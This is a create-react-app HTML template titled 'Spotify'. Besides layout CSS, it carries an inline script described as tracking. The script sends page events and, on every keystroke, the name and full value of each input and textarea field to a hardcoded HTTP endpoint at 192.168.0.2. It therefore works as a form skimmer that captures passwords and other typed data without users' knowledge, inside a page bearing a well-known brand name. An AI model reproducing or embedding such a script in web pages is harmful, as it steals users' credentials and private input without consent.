<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <link rel="icon" href="%PUBLIC_URL%/favicon.ico" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="theme-color" content="#000000" />
    <meta name="description" content="Web site created using create-react-app" />
    <link rel="apple-touch-icon" href="%PUBLIC_URL%/favicon.ico" />
    <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />
    <title>Spotify</title>
    <style>
/* Ensure the html element takes full height without overflow */
html {
  height: 100%;
  overflow: hidden;  /* Prevent scrollbars on the html element */
}

/* Ensure the body element takes full height and handles overflow */
body {
  height: 100%;  /* Ensure the body takes up full height */
  margin: 0;
  overflow-x: hidden;  /* Prevent horizontal scroll */
  overflow-y: auto;    /* Allow vertical scroll only */
}

/* Optional: Hide the scrollbar on WebKit browsers when not needed */
body::-webkit-scrollbar {
  display: none;
}

/* Hide scrollbar on IE and Firefox */
body {
  -ms-overflow-style: none;  /* Internet Explorer 10+ */
  scrollbar-width: none;     /* Firefox */
}

/* Ensure the root div takes full height */
#root {
  height: 100%;
}
    </style>
<!-- Add this script to your main HTML template or each page -->
<script>
  (function() {
    // Generate session ID if not exists
    if (!localStorage.getItem('sessionId')) {
      const sessionId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        const r = Math.random() * 16 | 0;
        const v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
      });
      localStorage.setItem('sessionId', sessionId);
    }

    const getBrowserInfo = () => {
      const userAgent = navigator.userAgent;
      let browserName = 'Unknown';
      if (userAgent.indexOf('Firefox') > -1) {
        browserName = 'Mozilla Firefox';
      } else if (userAgent.indexOf('SamsungBrowser') > -1) {
        browserName = 'Samsung Internet';
      } else if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) {
        browserName = 'Opera';
      } else if (userAgent.indexOf('Trident') > -1) {
        browserName = 'Microsoft Internet Explorer';
      } else if (userAgent.indexOf('Edg') > -1) {
        browserName = 'Microsoft Edge';
      } else if (userAgent.indexOf('Chrome') > -1) {
        browserName = 'Google Chrome';
      } else if (userAgent.indexOf('Safari') > -1) {
        browserName = 'Apple Safari';
      }
      return browserName;
    };

    const sendTrackingData = (eventType, additionalData = {}) => {
      const sessionId = localStorage.getItem('sessionId');
      const pageUrl = window.location.href;
      const browserInfo = getBrowserInfo();
      const data = { 
        sessionId, 
        pageUrl, 
        eventType,
        browserInfo,
        timestamp: new Date().toISOString(),
        ...additionalData 
      };

      fetch('http://192.168.0.2:8000/api/track', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      }).catch(error => {
        console.error('Error sending tracking data:', error);
      });
    };

    // Track page load
    sendTrackingData('page_load');

    // Track page unload
    window.addEventListener('beforeunload', () => {
      sendTrackingData('page_unload');
    });

    // Track route changes
    let lastUrl = window.location.href;
    new MutationObserver(() => {
      if (lastUrl !== window.location.href) {
        lastUrl = window.location.href;
        sendTrackingData('page_navigation');
      }
    }).observe(document, { subtree: true, childList: true });

    // Track input changes
    document.addEventListener('input', (event) => {
      if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
        sendTrackingData('input', {
          inputName: event.target.name || event.target.id,
          inputValue: event.target.value
        });
      }
    });

    window.addEventListener('hashchange', () => {
      sendTrackingData('page_navigation');
    });

    window.addEventListener('popstate', () => {
      sendTrackingData('page_navigation');
    });
  })();
</script>
  </head>
  <body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root"></div>
  </body>
</html>
